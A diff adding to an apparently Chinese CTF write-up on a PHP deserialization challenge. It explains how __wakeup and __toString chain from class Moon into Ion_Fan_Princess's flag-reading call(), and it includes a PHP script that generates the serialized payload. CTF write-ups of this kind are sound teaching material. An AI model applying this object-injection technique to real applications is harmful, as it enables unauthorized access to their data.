@@ -58,6 +58,48 @@ if (isset($_GET['code'])){
 
 **构造流程**
 
-1. 获取GET请求参数 'code'，并将code反序列化
+```
+1. 获取GET请求参数 'code'，并将code反序列化。
 2. 反序列化时最先触发__wakeup函数，在Moon类中有这一函数。
-3. 在__wakeup函数中，
+3. 在__wakeup函数中，echo语句将当前对象的成员变量name当作字符串输出，若这里的变量name是某个类的对象，则会触发__toString函数。
+4. 这里两个类都有__toString函数，但观察到，Ion_Fan_Princess类中的__toString函数调用了call函数，而call函数有读取flag的操作，所以这里应当将Moon类中的变量name设置成Ion_Fan_Princess类的对象
+5. 观察Ion_Fan_Princess类中的call函数，当nickname的值为“小甜甜”时读取flag，所以这里要设置一下。
+```
+
+
+
+**编写exp**
+
+```php
+<?php
+class Moon{
+    public $name;
+}
+
+class Ion_Fan_Princess{
+    public $nickname;
+}
+
+$moon = new Moon();
+$ion = new Ion_Fan_Princess();
+
+$ion->nickname = "小甜甜";
+$moon->name = $ion;
+
+echo serialize($moon);
+```
+
+获得payload：
+
+![image-20221115202416081](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20221115202416081.png)
+
+传入即可：
+
+![image-20221115202440859](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20221115202440859.png)
+
+![image-20221115202349560](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20221115202349560.png)
+
+
+
+
+
